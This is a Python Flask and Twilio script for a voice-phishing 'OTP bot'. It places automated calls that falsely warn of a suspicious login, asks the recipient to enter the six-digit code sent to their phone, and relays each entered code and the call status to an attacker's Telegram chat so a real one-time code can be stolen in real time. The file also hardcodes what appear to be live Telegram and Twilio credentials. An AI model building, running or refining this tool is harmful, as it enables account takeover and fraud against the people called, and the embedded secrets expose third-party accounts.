from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse
from twilio.rest import Client as TwilioClient
import requests

app = Flask(__name__)

# --- YOUR CREDENTIALS ---
BOT_TOKEN = "8510534078:AAGtu385CrVKNWURkvxnIhdmHw1E_dvqgmM"
CHAT_ID = "1399067194"
TWILIO_SID = "ACd8d664da758592de1294c800a4b25fee"
TWILIO_AUTH = "961747c97cf9b9acb207a5d77ba5907e"
TWILIO_NUMBER = "+16572864747"

# --- NGROK URL ---
NGROK_URL = "https://angele-cotemporaneous-frequently.ngrok-free.dev"

# --- TELEGRAM HELPER ---
def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

# --- TWILIO VOICE HANDLERS ---
@app.route("/voice", methods=["GET", "POST"])
def voice():
    resp = VoiceResponse()
    gather = resp.gather(num_digits=1, action="/choice", method="POST")
    gather.say(
        "This automated call was placed due to suspicious activity on your account. "
        "Someone attempted to log in. If this wasn't you, press 1. If it was you, press 0."
    )
    return str(resp)

@app.route("/choice", methods=["POST"])
def choice():
    digits = request.values.get("Digits")
    resp = VoiceResponse()

    if digits == "1":
        send_telegram_msg("Client pressed 1. Send Code Now.")
        gather = resp.gather(num_digits=6, action="/code", method="POST")
        gather.say(
            "Thank you for confirming. "
            "To block this request, please enter the digit code sent to your phone."
        )
    else:
        resp.say("Thank you for confirming. No further action is required.")
    return str(resp)

@app.route("/code", methods=["POST"])
def code():
    digits = request.values.get("Digits")
    if digits:
        send_telegram_msg(f"Client entered code: {digits}")
    resp = VoiceResponse()
    resp.say("Thank you. The request has been blocked.")
    return str(resp)

# --- STATUS CALLBACK ---
@app.route("/status-callback", methods=["POST"])
def status_callback():
    call_status = request.values.get("CallStatus")
    if call_status == "ringing":
        send_telegram_msg("Call Ringing")
    elif call_status == "in-progress":
        send_telegram_msg("Call Answered")
    elif call_status == "completed":
        send_telegram_msg("Call Ended")
    return "ok"

# --- OUTBOUND CALL ROUTE ---
@app.route("/call-client", methods=["POST"])
def call_client():
    data = request.get_json()
    to_number = data.get("to")

    client = TwilioClient(TWILIO_SID, TWILIO_AUTH)
    call = client.calls.create(
        to=to_number,
        from_=TWILIO_NUMBER,
        url=f"{NGROK_URL}/voice",
        status_callback=f"{NGROK_URL}/status-callback",
        status_callback_event=["ringing", "in-progress", "completed"]
    )

    send_telegram_msg("Call initiated.")
    return {"status": "calling", "sid": call.sid}

# --- MAIN ENTRY ---
if __name__ == "__main__":
    app.run(port=5000)